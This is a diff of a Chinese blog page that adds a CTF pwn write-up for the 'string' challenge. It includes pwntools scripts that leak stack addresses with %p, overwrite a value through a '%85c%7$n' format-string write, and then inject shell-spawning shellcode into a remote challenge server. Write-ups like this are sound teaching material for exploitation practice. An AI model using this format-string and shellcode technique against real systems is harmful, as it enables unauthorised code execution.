@@ -20,18 +20,21 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="分析： 在main()中定义指针v3，malloc函数返回给v3一个地址（这里称作[0]），此时指针v3存放一个[0]，指向未知内容。定义整型v5，将令v5&#x3D;v3&#x3D;[0]。令v3指向68。修改v3的下一个地址（这里称作[1]）为85。 在sub_400D72(v5)中参数传递int a1&#x3D;v5 在sub_400CA6(a1)中参数传递新变量，指针a1（局部函数同名）存放a1，即存放[0]，指向68">
+  <meta name="description" content="分析在main()中定义指针v3，malloc函数返回给v3一个地址（这里称作[0]），此时指针v3存放一个[0]，指向未知内容。定义整型v5，将令v5&#x3D;v3&#x3D;[0]。令v3指向68。修改v3的下一个地址（这里称作[1]）为85。 在sub_400D72(v5)中参数传递int a1&#x3D;v5 在sub_400CA6(a1)中参数传递新变量，指针a1（局部函数同名）存放a1，即存放[0]，指向68 因">
 <meta property="og:type" content="article">
 <meta property="og:title" content="AD_string">
 <meta property="og:url" content="http://example.com/2021/03/25/AD-string/index.html">
 <meta property="og:site_name" content="全宇宙最蒻的博客">
-<meta property="og:description" content="分析： 在main()中定义指针v3，malloc函数返回给v3一个地址（这里称作[0]），此时指针v3存放一个[0]，指向未知内容。定义整型v5，将令v5&#x3D;v3&#x3D;[0]。令v3指向68。修改v3的下一个地址（这里称作[1]）为85。 在sub_400D72(v5)中参数传递int a1&#x3D;v5 在sub_400CA6(a1)中参数传递新变量，指针a1（局部函数同名）存放a1，即存放[0]，指向68">
+<meta property="og:description" content="分析在main()中定义指针v3，malloc函数返回给v3一个地址（这里称作[0]），此时指针v3存放一个[0]，指向未知内容。定义整型v5，将令v5&#x3D;v3&#x3D;[0]。令v3指向68。修改v3的下一个地址（这里称作[1]）为85。 在sub_400D72(v5)中参数传递int a1&#x3D;v5 在sub_400CA6(a1)中参数传递新变量，指针a1（局部函数同名）存放a1，即存放[0]，指向68 因">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/03/25/AD-string/1.png">
+<meta property="og:image" content="http://example.com/2021/03/25/AD-string/3.png">
 <meta property="article:published_time" content="2021-03-25T08:03:12.000Z">
-<meta property="article:modified_time" content="2021-03-26T13:36:19.114Z">
+<meta property="article:modified_time" content="2021-03-27T03:42:18.069Z">
 <meta property="article:author" content="带废物">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/03/25/AD-string/1.png">
 
 <link rel="canonical" href="http://example.com/2021/03/25/AD-string/">
 
@@ -187,7 +190,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-26 21:36:19" itemprop="dateModified" datetime="2021-03-26T21:36:19+08:00">2021-03-26</time>
+                <time title="Modified: 2021-03-27 11:42:18" itemprop="dateModified" datetime="2021-03-27T11:42:18+08:00">2021-03-27</time>
               </span>
 
           
@@ -201,13 +204,19 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>分析：</p>
-<p>在main()中<br>定义指针v3，malloc函数返回给v3一个地址（这里称作[0]），此时指针v3存放一个[0]，指向未知内容。<br>定义整型v5，将令v5=v3=[0]。<br>令v3指向68。<br>修改v3的下一个地址（这里称作[1]）为85。</p>
+        <h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>在main()中<br>定义指针v3，malloc函数返回给v3一个地址（这里称作[0]），此时指针v3存放一个[0]，指向未知内容。<br>定义整型v5，将令v5=v3=[0]。<br>令v3指向68。<br>修改v3的下一个地址（这里称作[1]）为85。</p>
 <p>在sub_400D72(v5)中<br>参数传递int a1=v5</p>
 <p>在sub_400CA6(a1)中<br>参数传递新变量，指针a1（局部函数同名）存放a1，即存放[0]，指向68</p>
 <p>因为指针a1与指针v3存放同一个地址，所以a1就是v3，故<strong>*a1</strong>=68，a1[1]=85。<br>题目要求使<strong>*a1</strong>等于a1[1]，这里选择将<strong>*a1</strong>更改为85。</p>
-<p>主要思路：利用printf格式化字符串漏洞，算出修改地址[0]所需要的偏移量。再利用一遍，往[0]写入68。最后用shellcode拿到flag。</p>
-
+<h1 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路"></a>主要思路</h1><p>利用printf格式化字符串漏洞，算出修改地址[0]所需要的偏移量。再利用一遍，往[0]写入68。最后用shellcode拿到flag。</p>
+<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用于把其它的东西转换成整形</span></span><br><span class="line"><span class="comment">#class int(x, base=10)，base是声明x的进制的参数，默认为10</span></span><br><span class="line">var1=int(str,<span class="number">16</span>) <span class="comment">#字符串只能是16进制</span></span><br><span class="line">var2=int(str[<span class="number">0</span>:n],<span class="number">16</span>) <span class="comment">#把str字符串第0位到n-1位的10进制存入var2</span></span><br><span class="line">var3=int(str[:<span class="number">-1</span>],<span class="number">16</span>) <span class="comment">#选中除了最后一位的所有字符串</span></span><br><span class="line"><span class="comment">#对于不在16进制内的字符，会产生编译错误（\n 例外，这个直接忽略）</span></span><br></pre></td></tr></table></figure>
+<h1 id="格式化字符串漏洞利用具体"><a href="#格式化字符串漏洞利用具体" class="headerlink" title="格式化字符串漏洞利用具体"></a>格式化字符串漏洞利用具体</h1><p>脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os =<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">39003</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;secret[0] is &quot;</span>)</span><br><span class="line">s0=io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">v3_addr=int(s0[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;What should your character&#x27;s name be:&quot;</span>,<span class="string">&quot;yy&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;So, where you will go?east or up?:&quot;</span>,<span class="string">&quot;east&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;go into there(1), or leave(0)?:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Give me an address&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;And, you wish is:&quot;</span>,<span class="string">&quot;AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;I hear it, I hear it....&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
+<img src="/2021/03/25/AD-string/1.png" class>
+<p>v2的地址和format的地址很近，format写入AAAA，v2写入1<br>泄露出format、v2的地址，算偏移。</p>
+<p>得知v2为栈内第7个元素，format为第8个，printf函数进栈顺序在CGfsb里有详情。<br><img src="/2021/03/25/AD-string/3.png" class></p>
+<p>接下来再次攻击时，往v2写入我们想要的地址，注意v2的变量是整形，同时send只能发送字符串。所以将想要写入的地址v3_add即[0]，但v3_add已经在之前就被转为整形，这里只要将它当初字符串发送即可。</p>
+<p>printf(“%85c%7$n”)会想偏移第7处，所存的地址指向的地址出，写入85（%85c相当于85个字符）。（详情见CGfsb）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os =<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">47546</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;secret[0] is &quot;</span>)</span><br><span class="line">s0=io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">v3_addr=int(s0[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;What should your character&#x27;s name be:&quot;</span>,<span class="string">&quot;yy&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;So, where you will go?east or up?:&quot;</span>,<span class="string">&quot;east&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;go into there(1), or leave(0)?:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Give me an address&quot;</span>,str(v3_addr))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;And, you wish is:&quot;</span>,<span class="string">&quot;%85c%7$n&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;USE YOU SPELL&quot;</span>, shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
     </div>
 
     
@@ -290,6 +299,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E6%80%9D%E8%B7%AF"><span class="nav-number">2.</span> <span class="nav-text">主要思路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A1%A5%E5%85%85"><span class="nav-number">3.</span> <span class="nav-text">补充</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%85%B7%E4%BD%93"><span class="nav-number">4.</span> <span class="nav-text">格式化字符串漏洞利用具体</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
